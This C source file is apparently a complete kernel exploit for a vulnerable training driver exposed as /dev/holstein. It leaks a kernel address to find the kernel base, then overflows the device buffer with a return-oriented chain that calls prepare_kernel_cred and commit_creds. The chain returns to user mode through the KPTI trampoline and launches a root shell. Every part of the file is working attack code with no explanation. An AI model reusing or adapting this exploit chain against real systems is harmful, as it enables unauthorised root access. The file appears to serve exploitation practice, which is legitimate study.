#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>

#define ERROR(x) printf("Error: %s\n", x); return -1;
uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t prepare_kernel_cred                        = 0x06e240;
uint64_t commit_cred                                = 0x06e390;
uint64_t iretq                                      = 0x0202af;
uint64_t swapgs_restore_regs_and_return_to_usermode = 0x800e26;
uint64_t pop_rdi_ret                                = 0x27bbdc;
uint64_t pop_rcx_ret                                = 0x32cdd3;
uint64_t mov_rdi_rax_rep_movsq_ret                  = 0x60c96b;


void spawn_shell(void){
    printf("We back to userland!\n");
    uint8_t uid = getuid();
    if(uid == 0){
        printf("UID is: %d\nYou just rooted the machine!\n", uid);
    }
    else {
        printf("UID is: %d\nYou didn't root the machine unfortunately..\n", uid);
        exit(-1);
    }
    system("/bin/sh");
}

uint64_t user_rip = (uint64_t) spawn_shell;
void save_user_state(void){ // save the state of our user context
   __asm__(
    ".intel_syntax noprefix;"
    "mov user_cs, cs;"  // user code segment
    "mov user_ss, ss;"  // user stack segment
    "mov user_sp, rsp;" // user stack
    "pushfq;"           // user rflags
    "pop user_rflags;" 
    ".att_syntax;"
    );
}

int main(int argc, char **argv){
    save_user_state();
    int fd, i;
    uint64_t payload[0x500], leak[0x500];
    if((fd = open("/dev/holstein", O_RDWR)) < 0){ERROR("failed to open /dev/holstein..")}
    if(read(fd, leak, 0x410) < 0){ERROR("failed to read from the device..")}
    uint64_t kbase = leak[0x408/sizeof(uint64_t)] - 0x13d33c;
    printf("[+] kbase: %p\n", kbase);

    prepare_kernel_cred                        += kbase;
    commit_cred                                += kbase;                             
    iretq                                      += kbase;
    swapgs_restore_regs_and_return_to_usermode += kbase;
    pop_rdi_ret                                += kbase;
    pop_rcx_ret                                += kbase;
    mov_rdi_rax_rep_movsq_ret                  += kbase;


    i = 0x408 / sizeof(uint64_t);
    payload[i++] = pop_rdi_ret;
    payload[i++] = 0x0;
    payload[i++] = prepare_kernel_cred;
    payload[i++] = pop_rcx_ret; // to bypass rep movsq qword ptr [rdi], qword ptr [rsi], we could also do commit_creds(init_cred)
    payload[i++] = 0x0;
    payload[i++] = mov_rdi_rax_rep_movsq_ret; 
    payload[i++] = commit_cred;
    payload[i++] = swapgs_restore_regs_and_return_to_usermode; // kpti trampoline
    payload[i++] = 0x0;
    payload[i++] = 0x0;
    payload[i++] = user_rip;
    payload[i++] = user_cs;
    payload[i++] = user_rflags;
    payload[i++] = user_sp;
    payload[i++] = user_ss;

    if(write(fd, payload, (void *) payload + i * sizeof(uint64_t)  - (void *)payload) < 0){ERROR("failed to write to the device..")}
    
    return 0;
}